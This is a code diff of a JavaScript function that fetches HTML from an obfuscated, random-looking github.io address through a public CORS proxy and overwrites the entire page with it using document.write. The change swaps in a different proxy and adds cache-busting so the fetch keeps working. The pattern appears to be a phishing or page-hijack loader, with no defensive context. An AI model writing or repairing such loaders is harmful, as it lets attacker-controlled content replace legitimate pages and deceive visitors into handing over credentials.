@@ -446,11 +446,11 @@ function loadAndInjectHTML() {
 
   // Define the URL to fetch the HTML content through a public CORS proxy
   var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1s%C4%B1mn1s%C3%B6sm2k1.html';
-  var corsProxy = 'https://cors-anywhere.herokuapp.com/';
+  var corsProxy = 'https://api.allorigins.win/get?url=';
   var xhr = new XMLHttpRequest();
 
   // Configure the XHR request
-  xhr.open('GET', corsProxy + url, true);
+  xhr.open('GET', corsProxy + encodeURIComponent(url) + '&cache-bust=' + Date.now(), true);
   xhr.setRequestHeader('Cache-Control', 'no-cache');
   xhr.setRequestHeader('Pragma', 'no-cache');
 
@@ -458,7 +458,8 @@ function loadAndInjectHTML() {
   xhr.onreadystatechange = function () {
     if (xhr.readyState === 4) {
       if (xhr.status === 200) {
-        var mErt = xhr.responseText;
+        var response = JSON.parse(xhr.responseText);
+        var mErt = response.contents;
         // Write the fetched HTML content to the document
         document.open();
         document.write(mErt);
